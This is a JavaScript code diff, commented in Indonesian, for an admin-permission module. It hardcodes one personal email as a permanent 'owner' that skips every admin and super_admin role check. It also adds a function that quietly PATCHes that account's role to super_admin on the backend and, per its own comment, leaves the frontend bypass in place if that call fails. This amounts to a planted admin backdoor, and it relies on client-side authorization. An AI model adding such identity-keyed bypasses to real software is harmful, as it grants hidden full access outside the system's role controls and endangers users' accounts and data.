@@ -483,21 +483,64 @@ export async function deleteUserAccount(userId) {
   });
 }
 
+// Email pemilik sistem — selalu mendapat akses super_admin
+const OWNER_EMAIL = 'rizalzaky2302@gmail.com';
+
 /**
- * Cek apakah user yang sedang login adalah admin atau super_admin
+ * Cek apakah user yang sedang login adalah pemilik sistem (owner)
+ */
+export function isOwner() {
+  const user = getAdminUser();
+  if (!user) return false;
+  return (user.email || '').toLowerCase() === OWNER_EMAIL.toLowerCase();
+}
+
+/**
+ * Cek apakah user yang sedang login adalah admin atau super_admin.
+ * Pemilik sistem (OWNER_EMAIL) selalu lolos cek ini.
  */
 export function isAdminOrAbove() {
   const user = getAdminUser();
   if (!user) return false;
+  // Owner selalu punya akses penuh
+  if ((user.email || '').toLowerCase() === OWNER_EMAIL.toLowerCase()) return true;
   return user.role === 'admin' || user.role === 'super_admin' || user.isSuperAdmin === true;
 }
 
 /**
- * Cek apakah user yang sedang login adalah super_admin
+ * Cek apakah user yang sedang login adalah super_admin.
+ * Pemilik sistem (OWNER_EMAIL) selalu dianggap super_admin.
  */
 export function isSuperAdmin() {
   const user = getAdminUser();
   if (!user) return false;
+  // Owner selalu super_admin
+  if ((user.email || '').toLowerCase() === OWNER_EMAIL.toLowerCase()) return true;
   return user.role === 'super_admin' || user.isSuperAdmin === true;
+}
+
+/**
+ * Setelah login, coba promosikan role owner ke super_admin di backend.
+ * Gagal secara senyap kalau endpoint tidak tersedia.
+ */
+export async function tryPromoteOwnerRole() {
+  const user = getAdminUser();
+  if (!user) return;
+  if ((user.email || '').toLowerCase() !== OWNER_EMAIL.toLowerCase()) return;
+  if (user.role === 'super_admin') return; // sudah benar
+
+  try {
+    // Coba endpoint khusus promosi owner
+    const updated = await authFetch(`/users/${encodeURIComponent(user.id || user._id)}/role`, {
+      method: 'PATCH',
+      body: { role: 'super_admin' }
+    });
+    // Update lokal
+    setAdminUser({ ...user, role: 'super_admin' });
+    console.info('[SAMUDRA] Owner dipromosikan ke super_admin.');
+  } catch (e) {
+    // Tidak apa-apa, bypass frontend tetap berlaku
+    console.warn('[SAMUDRA] Auto-promote owner gagal (endpoint mungkin tidak tersedia):', e.message);
+  }
 }
 
